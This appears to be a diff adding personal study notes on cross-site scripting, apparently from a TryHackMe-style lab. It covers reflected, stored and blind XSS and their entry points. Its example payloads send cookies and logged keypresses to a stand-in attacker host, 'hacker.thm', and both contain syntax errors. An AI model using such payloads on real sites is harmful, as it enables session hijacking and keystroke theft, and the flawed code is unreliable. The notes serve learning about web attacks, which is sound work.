@@ -1,0 +1,31 @@
+Involves creating and delivering malicious payload to the target system. 
+I think it also involves testing the boundaries of a system to detect potential vulnerabilities.
+Different XSS types include
+REFLECTED XSS
+  User supplied data in an HTTP request is included in the webpage source without any validation.
+Possible entry points include;
+i. Parameters in the URL Query string
+ii. URL File Path
+Sometimes HTTP headers.
+
+STORED XSS
+  Stored on the webapp(Database); it runs when the site is visited. 
+Possible entry points
+i. Comments on a blog.
+ii. User profile info.
+iii. Website listings.
+
+BLIND XSS
+  Delivers payload to test against yourself.
+
+1. Creating Payloads
+2. Payload Modification
+
+A PAyload has 2 parts: Intention and Modification. eg
+<script>alert(XSS);</script>
+
+Session stealing(Cookies)
+Example( <script> fetch('https://hacker.thm/steal?rookie='btoa(document.cookie));<script>
+
+KEYLOGGER
+<script>document.onkeypress=function(e){fetch('https://hacker.thm/log?key='+btoa(e.key/);}</script>)
